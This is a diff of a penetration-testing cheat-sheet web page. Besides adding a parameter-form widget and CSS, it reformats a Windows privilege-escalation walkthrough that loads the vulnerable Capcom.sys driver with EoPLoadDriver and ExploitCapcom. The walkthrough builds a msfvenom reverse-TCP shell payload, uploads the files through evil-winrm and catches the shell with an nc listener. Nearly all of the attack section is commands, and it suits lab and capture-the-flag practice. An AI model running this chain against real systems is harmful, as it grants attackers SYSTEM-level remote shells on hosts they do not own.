@@ -197,57 +197,181 @@
   <li><a href="https://tldrbins.github.io/@secretsdump/">Secretsdump</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="abuse-1-install-malicious-driver">Abuse #1: Install malicious driver</h3>
 <h4 id="1-compile-eoploaddriver">1. Compile eoploaddriver</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+---------------------------------------------------------------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 1. Open Visual Studio <span class="m">2022</span>                                                            <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 2. Create a new project                                                               <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 3. Project Template : C++ Console App                                                 <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 4. Project Name     : Eoploaddriver                                                   <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 5. Replace code     : eoploaddriver.cpp                                               <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 6. Remove header    : <span class="sb">`</span>include <span class="s2">&#34;stdafx.h&#34;</span><span class="sb">`</span>                                            <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 7. Release -&gt; x64                                                                     <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 8. Build   -&gt; Build Solution                                                          <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 9. Exported to C:<span class="se">\U</span>sers<span class="se">\u</span>ser<span class="se">\s</span>ource<span class="se">\r</span>epos<span class="se">\E</span>oploaddriver<span class="se">\x</span>64<span class="se">\R</span>elease<span class="se">\E</span>oploaddriver.exe <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+---------------------------------------------------------------------------------------+
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+---------------------------------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| 1. Open Visual Studio 2022                                                            |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Create a new project                                                               |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 3. Project Template : C++ Console App                                                 |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 4. Project Name     : Eoploaddriver                                                   |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 5. Replace code     : eoploaddriver.cpp                                               |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 6. Remove header    : `include &#34;stdafx.h&#34;`                                            |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 7. Release -&gt; x64                                                                     |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 8. Build   -&gt; Build Solution                                                          |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe |
+</span></span></span><span class="line"><span class="cl"><span class="go">+---------------------------------------------------------------------------------------+
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp">eoploaddriver.cpp</a></em></small></p>
 <h4 id="2-download-capcomsys">2. Download Capcom.sys</h4>
 <p><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">Capcom.sys</a></p>
 <h4 id="3-compile-exploitcapcom">3. Compile ExploitCapcom</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+----------------------------------------------------------------------------------------+
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 1. Double click ExploitCapcom.sln                                                      <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 2. Replace the payload to <span class="sb">`</span>TCHAR CommandLine<span class="o">[]</span> <span class="o">=</span> TEXT<span class="o">(</span><span class="s2">&#34;C:\\Windows\\Tasks\\rev.exe&#34;</span><span class="o">)</span><span class="p">;</span><span class="sb">`</span> <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 3. Release -&gt; x64                                                                      <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 4. Build   -&gt; Build Solution                                                           <span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> 5. Exported to .<span class="se">\x</span>64<span class="se">\R</span>elease<span class="se">\E</span>xploitCapcom.exe                                         <span class="p">|</span>
-</span></span><span class="line"><span class="cl">+----------------------------------------------------------------------------------------+
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------------------------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| 1. Double click ExploitCapcom.sln                                                      |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 2. Replace the payload to `TCHAR CommandLine[] = TEXT(&#34;C:\\Windows\\Tasks\\rev.exe&#34;);` |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 3. Release -&gt; x64                                                                      |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 4. Build   -&gt; Build Solution                                                           |
+</span></span></span><span class="line"><span class="cl"><span class="go">| 5. Exported to .\x64\Release\ExploitCapcom.exe                                         |
+</span></span></span><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------------------------------------+
+</span></span></span></code></pre></div></div>
 <p><small><em>Ref: <a href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">ExploitCapcom</a></em></small></p>
 <h4 id="3-create-stageless-payload">3. Create stageless payload</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o rev.exe
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;LOCAL_IP&gt; LPORT=&lt;LOCAL_PORT&gt; -f exe -o rev.exe
+</span></span></span></code></pre></div></div>
 <h4 id="4-upload">4. Upload</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># For example (evil-winrm)</span>
-</span></span><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="n">rev</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">rev</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example <span class="o">(</span>evil-winrm<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">upload Eoploaddriver.exe C:\ProgramData\Eoploaddriver.exe
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload Capcom.sys C:\ProgramData\Capcom.sys
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload ExploitCapcom.exe C:\ProgramData\ExploitCapcom.exe
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">upload rev.exe C:\ProgramData\rev.exe
+</span></span></span></code></pre></div></div>
 <h4 id="5-exploit">5. Exploit</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a nc listener</span>
-</span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">443</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Eoploaddriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">test</span> <span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">Capcom</span><span class="p">.</span><span class="py">sys</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ExploitCapcom</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a nc listener
+</span></span><span class="line"><span class="cl"><span class="go">rlwrap nc -lvnp &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\ProgramData\Eoploaddriver.exe System\CurrentControlSet\test C:\ProgramData\Capcom.sys
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">C:\ProgramData\ExploitCapcom.exe
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
